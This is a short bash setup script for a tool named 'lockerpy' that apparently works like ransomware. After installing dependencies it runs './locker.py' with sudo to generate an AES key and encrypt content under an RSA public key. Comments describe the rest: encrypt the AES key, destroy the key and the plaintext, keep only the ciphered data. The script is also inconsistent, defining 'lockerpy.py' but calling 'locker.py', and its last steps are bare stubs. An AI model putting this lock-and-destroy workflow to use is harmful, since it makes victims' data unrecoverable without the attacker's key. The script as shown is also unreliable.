#!/bin/bash

# This script sets up everything for running lockerpy

set -e

# Required system packages
REQUIRED_PACKAGES=(git python3 virtualenv)

echo "[+] Installing required packages..."
sudo apt update || true
sudo apt install -y "${REQUIRED_PACKAGES[@]}"

# Define paths
rootPath="$(dirname "$(realpath "$0")")"
envPath="$rootPath/Env"
locker="$rootPath/lockerpy.py"
payload="$rootPath/lpayload.py"

# Create virtual environment
echo "[+] Creating virtual environment..."
virtualenv "$envPath" --python=python3

# Activate and install Python dependencies
echo "[+] Installing Python dependencies..."
source "$envPath/bin/activate"
pip install -r requirements.txt


# Generate AES random key
sudo ./locker.py -ag AES_keys/aes_key1

# Cipher content with AES key
sudo ./locker.py -re AES_keys/aes_key1 -rpub RSA/lock_pem.pub

# Cipher AES key

# Destroy AES key and plain content

# Preserve only the ciphered version
